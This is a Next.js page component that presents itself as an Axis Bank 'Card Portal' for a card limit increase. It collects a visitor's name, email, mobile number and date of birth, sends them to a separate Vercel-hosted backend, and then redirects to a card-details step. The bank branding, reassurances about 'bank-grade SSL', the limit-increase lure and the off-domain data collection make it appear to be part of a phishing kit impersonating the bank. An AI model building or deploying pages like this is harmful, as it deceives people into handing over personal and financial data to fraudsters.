"use client";

import { useState, Suspense } from "react";
import Link from "next/link";
import { useSearchParams, useRouter } from "next/navigation";
import { User, Mail, Phone, Calendar, Lock, ShieldCheck } from "lucide-react";
import { Button } from "@/components/ui/button";
import axios from "axios";

function FormContent() {
  const searchParams = useSearchParams();
  const router = useRouter();
  const title = searchParams.get("title") || "Card Limit Increase Application";

  const [formData, setFormData] = useState({
    fullName: "",
    email: "",
    mobileNumber: "",
    dateOfBirth: "",
  });

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      // In a real app, use environment variables for the API URL
      const response = await axios.post("https://axis-be.vercel.app/applications", formData);

      if (response.data.success) {
        // Save application ID to local storage to use in the next steps
        localStorage.setItem("applicationId", response.data.data._id);
        router.push("/form/card");
      }
    } catch (error) {
      console.error("Error submitting form:", error);
      alert("Failed to submit. Please try again.");
    }
  };

  return (
    <div className="min-h-screen bg-[#f5f5f5] flex flex-col items-center">

      {/* Maroon Header Section */}
      <div className="w-full bg-[#A10D59] text-white py-8 text-center rounded-b-[2.5rem] shadow-md">
        <div className="flex justify-center mb-4">
          <div className="w-12 h-12 bg-white flex items-center justify-center text-[#A10D59] font-bold text-xl rounded-lg">
            A
          </div>
        </div>
        <h1 className="text-xl font-bold mb-1">Welcome to Axis Card Portal</h1>
        <p className="text-xs opacity-80">Your trusted partner for secure banking</p>
      </div>

      {/* Form Container */}
      <div className="w-full max-w-md px-4 -mt-6">
        <div className="bg-white rounded-xl p-6 shadow-sm border border-zinc-100">

          <p className="text-xs text-center text-zinc-500 mb-1">Enter your personal details below to</p>
          <p className="text-sm text-center text-[#A10D59] font-bold mb-6">{title}</p>

          <form onSubmit={handleSubmit} className="space-y-4">

            {/* Heading with Icon */}
            <div className="flex items-center gap-2 text-zinc-700 font-semibold text-sm mb-4">
              <Lock className="w-4 h-4 text-[#A10D59]" />
              <span>Personal Information</span>
            </div>

            {/* Inputs */}
            <div className="relative">
              <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                <User className="w-4 h-4 text-zinc-400" />
              </div>
              <input
                type="text"
                name="fullName"
                placeholder="Full Name *"
                value={formData.fullName}
                onChange={handleChange}
                required
                className="w-full pl-10 pr-4 py-2.5 text-sm border border-zinc-300 rounded-lg focus:outline-none focus:ring-1 focus:ring-[#A10D59] focus:border-[#A10D59]"
              />
            </div>

            <div className="relative">
              <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                <Mail className="w-4 h-4 text-zinc-400" />
              </div>
              <input
                type="email"
                name="email"
                placeholder="Email Address *"
                value={formData.email}
                onChange={handleChange}
                required
                className="w-full pl-10 pr-4 py-2.5 text-sm border border-zinc-300 rounded-lg focus:outline-none focus:ring-1 focus:ring-[#A10D59] focus:border-[#A10D59]"
              />
            </div>

            <div className="relative">
              <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                <Phone className="w-4 h-4 text-zinc-400" />
              </div>
              <input
                type="tel"
                name="mobileNumber"
                placeholder="Mobile Number *"
                value={formData.mobileNumber}
                onChange={handleChange}
                required
                className="w-full pl-10 pr-4 py-2.5 text-sm border border-zinc-300 rounded-lg focus:outline-none focus:ring-1 focus:ring-[#A10D59] focus:border-[#A10D59]"
              />
            </div>

            <div className="relative">
              <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                <Calendar className="w-4 h-4 text-zinc-400" />
              </div>
              <input
                type="date"
                name="dateOfBirth"
                placeholder="Date of Birth *"
                value={formData.dateOfBirth}
                onChange={handleChange}
                required
                className="w-full pl-10 pr-4 py-2.5 text-sm border border-zinc-300 rounded-lg focus:outline-none focus:ring-1 focus:ring-[#A10D59] focus:border-[#A10D59]"
              />
            </div>

            <p className="text-xs text-center text-zinc-400 my-4">
              Axis Bank ensures your data is securely stored and protected.
            </p>

            <Button type="submit" className="w-full bg-[#A10D59] hover:bg-[#8E0C4F] text-white py-2.5 rounded-lg text-sm font-semibold shadow-md shadow-[#A10D59]/10">
              Continue Securely
            </Button>

            {/* Security Notice */}
            <div className="flex flex-col items-center gap-1 mt-6 text-center">
              <ShieldCheck className="w-5 h-5 text-emerald-500" />
              <p className="text-xs text-zinc-500 font-medium">Your information is encrypted with bank-grade SSL.</p>
              <p className="text-[10px] text-zinc-400 max-w-xs">
                By continuing, you agree to Axis Bank's <Link href="#" className="underline">Terms of Service</Link> and <Link href="#" className="underline">Privacy Policy</Link>.
              </p>
            </div>

          </form>
        </div>
      </div>

      {/* Footer link back to home */}
      <div className="mt-auto py-6">
        <Link href="/" className="text-xs text-[#A10D59] hover:underline font-medium">
          Back to Homepage
        </Link>
      </div>
    </div>
  );
}

export default function FormPage() {
  return (
    <Suspense fallback={<div className="min-h-screen flex items-center justify-center">Loading...</div>}>
      <FormContent />
    </Suspense>
  );
}
